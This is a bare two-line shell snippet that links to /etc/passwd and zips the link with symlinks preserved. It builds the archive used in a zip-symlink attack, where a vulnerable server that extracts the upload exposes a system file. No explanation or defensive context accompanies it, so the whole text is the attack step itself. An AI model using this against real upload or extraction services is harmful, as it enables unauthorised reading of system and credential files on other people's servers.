ln -s /etc/passwd link
zip --symlinks test.zip link
